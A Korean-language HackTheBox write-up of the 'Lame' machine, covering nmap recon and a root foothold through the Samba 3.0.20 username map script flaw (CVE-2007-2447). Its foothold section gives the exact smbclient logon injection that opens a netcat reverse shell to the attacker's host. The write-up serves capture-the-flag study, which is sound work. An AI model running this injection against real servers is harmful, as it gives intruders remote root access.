---
title: "HTB - Lame"
date: 2026-06-02 00:00:00 +0900
categories: [HTB, Machine]
tags: [htb, writeup, linux, easy, samba, cve-2007-2447]
protected: true
description: HackTheBox Lame 머신 롸업
---

## Machine Info

| 항목 | 내용 |
|------|------|
| OS | Linux |
| 난이도 | Easy |
| 출제자 | ch4p |
| 취약점 | Samba 3.0.20 RCE (CVE-2007-2447) |

## Recon

### Nmap

```bash
nmap -sC -sV -oN nmap/initial 10.10.10.3
```

결과:
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1
139/tcp open  netbios-ssn Samba 3.0.20
445/tcp open  netbios-ssn Samba 3.0.20

## Foothold

Samba 3.0.20 버전은 CVE-2007-2447 취약점이 존재합니다.
username 필드에 쉘 메타문자를 삽입해 RCE가 가능합니다.

```bash
smbclient //10.10.10.3/tmp
logon "/=`nohup nc -e /bin/sh 10.10.14.x 4444`"
```

## Privilege Escalation

초기 접근 시 이미 root 권한으로 셸이 획득됩니다.

## Flags
user.txt : [REDACTED]
root.txt : [REDACTED]

## 정리

- Samba 3.0.20의 username map script 취약점 악용
- 별도 권한 상승 없이 root 획득 가능한 Easy 머신
